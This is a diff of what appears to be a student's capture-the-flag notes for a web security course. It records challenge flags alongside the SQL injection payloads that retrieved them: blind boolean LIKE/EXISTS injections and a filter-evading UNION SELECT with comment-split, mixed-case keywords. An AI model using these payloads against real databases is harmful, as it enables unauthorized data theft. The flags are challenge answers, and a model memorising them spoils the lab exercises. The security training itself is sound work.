@@ -2,3 +2,6 @@ nopoke: COMP6843{e65e9af7-704a-4acd-944c-d67cb8dc3442}
 ' and name like 'Ab%' and exists(select flag from flag where flag like 'COMP6843{e65e9af7-704a-4acd-944c-d67cb8dc3442}') --
 oobydooby: COMP6843{a14f589c-9b86-4f98-8160-454c588e108f}
 ' and name like 'A%' and exists(select flag from flag where flag like 'COMP6843{a14f589c-9b86-4f98-8160-454c588e108f}') --
+moonshot: flag{i_hope_you_learned_to_model_your_sql_queries_first_183b1aba-f8d3-4702-b7da-283e4ed75226}
+2/**/UnIon/**/SeleCt/**/NulL,flAg/**/fROm/**/flAg
+
